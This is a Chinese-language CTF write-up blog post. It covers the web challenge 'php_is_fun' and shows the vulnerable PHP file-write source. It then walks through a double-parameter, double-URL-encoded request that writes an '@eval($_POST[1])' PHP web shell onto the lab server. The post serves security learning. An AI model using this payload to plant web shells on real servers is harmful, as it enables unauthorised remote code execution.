---
title: WEB 杂记
tags: [write-up]
date: 2017-05-07 19:41
---
把早期的web题刷一刷，把其中一些比较好的给记录下来以便整理、学习
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><p><div class="toc"><div class="toc">
<ul>
<li><a href="#1-phpisfun">php_is_fun</a></li>
</ul>
</div>
</div>
</p>
<blockquote>
<p>把早期的web题刷一刷，把其中一些比较好的给记录下来以便整理、学习</p>
</blockquote>
<hr>
<h1 id="1-phpisfun">1. php_is_fun</h1>
<blockquote>
<p>第七季极客大挑战</p>
</blockquote>
<pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>)){
    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>];
    <span class="hljs-variable">$path</span> = <span class="hljs-string">"upload/"</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'path'</span>];
}<span class="hljs-keyword">else</span>{
    show_source(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-keyword">exit</span>();
}

<span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$path</span>,<span class="hljs-string">'..'</span>) &gt; -<span class="hljs-number">1</span>){
    <span class="hljs-keyword">die</span>(<span class="hljs-string">'SYCwaf!'</span>);
}

<span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$url</span>,<span class="hljs-string">'http://127.0.0.1/'</span>) === <span class="hljs-number">0</span>){
    file_put_contents(<span class="hljs-variable">$path</span>, file_get_contents(<span class="hljs-variable">$url</span>));
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"console.log($path update successed!)"</span>;
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello.Geeker"</span>;
}</span></code></pre>
<p>题目分析： <br>
我们，整个题目的输入只有两个地方<code>path</code>和<code>file</code>我们要构造的payload也只能从这两个地方传入。两个参数的作用很简单这里就不说了。 <br>
我们的目的是将我的文件内容写入文件，发现了他会把path打印出来 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507184242461?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
因此我们想到利用二次传参，第一层将我们要写的内容打印出来，第二层将打印的内容写入文件 <br>
<code>http://127.0.0.1/2.php?path=%3C?php%20@eval($_POST[1]);?%3E&amp;file=http://127.0.0.1/</code> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507184515543?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<code>http://127.0.0.1/2.php?path=jj.php&amp;file=http://127.0.0.1/2.php?path=%3C?php%20@eval($_POST[1]);?%3E&amp;file=http://127.0.0.1/</code>注意二次编码 <br>
最后提交 <br>
<code>http://127.0.0.1/2.php?path=aaz.php&amp;file=http://127.0.0.1/2.php?path=%253C%253Fphp%2520@eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%26file=http://127.0.0.1/</code> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507184529856?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
然后访问<code>aaz.php</code> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507194127921?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></img></br></br></br></br></img></br></br></br></img></br></br></br></p></hr></div>